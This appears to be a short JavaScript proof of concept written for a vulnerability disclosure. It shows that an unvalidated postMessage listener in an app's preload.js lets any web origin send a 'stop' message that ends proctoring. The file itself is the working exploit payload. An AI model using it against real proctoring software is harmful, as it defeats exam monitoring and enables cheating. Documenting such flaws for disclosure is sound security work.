/**
 * Benign Proof of Concept: postMessage Proctoring Termination Vulnerability
 * 
 * Target: preload.js window.addEventListener('message')
 * Impact: Unvalidated message origins allow arbitrary web origins to send 
 * lifecycle state messages (e.g. stop proctoring actions).
 */

(function() {
    console.log("[PoC] Dispatching mock termination event to preload handler...");
    
    // Construct the payload matching the preload.js message listener schema
    const payload = {
        msg: "stop",
        Action: "stop"
    };

    // Dispatch the message. In the vulnerable app, the lack of origin validation
    // causes preload.js to blindly catch this event and call ipcRenderer.sendToHost('stop-proctoring')
    window.postMessage(payload, "*");
    
    console.log("[PoC] Event dispatched. Proctoring termination call initiated.");
})();
